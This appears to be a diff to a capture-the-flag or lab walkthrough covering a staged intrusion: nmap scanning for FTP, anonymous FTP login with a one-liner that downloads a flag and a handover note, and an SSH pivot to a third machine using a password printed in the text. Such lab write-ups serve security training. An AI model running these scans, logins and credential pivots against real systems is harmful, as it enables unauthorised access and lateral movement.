@@ -2,54 +2,62 @@
 
 **Challenge:** Anonymous FTP Access — Credential Exposure  
 **Technique:** T1078.001 — Valid Accounts: Default Accounts  
-**Entry Point:** From M1's shell, discover M2 on DMZ (11.0.0.0/8), port 21
+**Entry Point:** From M1's shell, discover M2 on the DMZ, then reach FTP on port 21.
+
+**Validated M2 address for this single-host deployment:** `10.0.2.15`
 
 ---
 
 ## Step 1 — Discover M2 from M1
 
-From your RCE shell on M1:
+From your RCE shell on M1. In this deployment, M2 was installed on the same host, so first confirm the host address and then verify FTP on the validated IP:
 
 ```bash
-# Identify DMZ interface on M1
 ip addr show
-# Note the 11.x.x.x interface
-
-# Scan DMZ for FTP
-nmap -p 21 --open -sV 11.0.0.0/8 --min-rate 2000 -oN /tmp/dmz_scan.txt
-cat /tmp/dmz_scan.txt
 ```
+
+![M2 host address](screenshots/m2_red_01_ip.png)
+
+The active interface reports `10.0.2.15`. Scan that verified address:
+
+```bash
+nmap -n -p 21 --open 10.0.2.15 --reason -oN /tmp/m2_ftp_scan.txt
+cat /tmp/m2_ftp_scan.txt
+```
+
+![FTP service discovery](screenshots/m2_red_02_scan.png)
+
+For a separate multi-host deployment, replace `10.0.2.15` with the verified M2 DMZ address before scanning.
 
 ---
 
 ## Step 2 — Anonymous FTP Login
 
 ```bash
-ftp <M2-DMZ-IP>
-# Username: anonymous
-# Password: (anything / blank)
+printf 'user anonymous anonymous\nls -la\nget flag2.txt /tmp/flag2.txt\nget staff_handover.txt /tmp/staff_handover.txt\nbye\n' | ftp -inv 10.0.2.15
 ```
 
-Or via command-line one-liner:
+The FTP username is `anonymous`; the password can be `anonymous` (or another non-empty value, depending on the server policy).
 
-```bash
-ftp -inv <M2-DMZ-IP> << 'EOF'
-user anonymous anonymous
-ls -la
-get flag2.txt /tmp/flag2.txt
-get staff_handover.txt /tmp/staff_handover.txt
-bye
-EOF
-```
+![Anonymous FTP command](screenshots/m2_red_03_ftp_command.png)
+
+![Anonymous FTP listing and downloads](screenshots/m2_red_03_ftp.png)
 
 ---
 
 ## Step 3 — Read the Files
 
 ```bash
-cat /tmp/flag2.txt          # Challenge flag
-cat /tmp/staff_handover.txt # SSH credentials for M3
+cat /tmp/flag2.txt
 ```
+
+![Read the FTP flag](screenshots/m2_red_04_flag.png)
+
+```bash
+cat /tmp/staff_handover.txt
+```
+
+![Read the staff handover note](screenshots/m2_red_04_handover.png)
 
 The handover note reveals:
 ```
@@ -63,10 +71,15 @@ Host: nova-gateway (SSH)
 ## Step 4 — Move to M3
 
 ```bash
-# From M1 (DMZ interface), reach M3 via DMZ or Priv subnet
-# M3 is dual-homed on DMZ — scan for SSH
-nmap -p 22 --open 11.0.0.0/8 --min-rate 2000
+# Check whether M3's SSH service is present on this host
+nmap -n -p 22 --open 10.0.2.15 --reason
+```
 
+![M3 SSH check](screenshots/m2_red_05_m3_scan.png)
+
+This combined M1/M2 deployment has no M3 SSH service on `10.0.2.15`, so the pivot was not attempted here. When M3 is provisioned separately, use its verified DMZ address:
+
+```bash
 ssh devops@<M3-DMZ-IP>
 # Password: N0vaTech@24
 ```
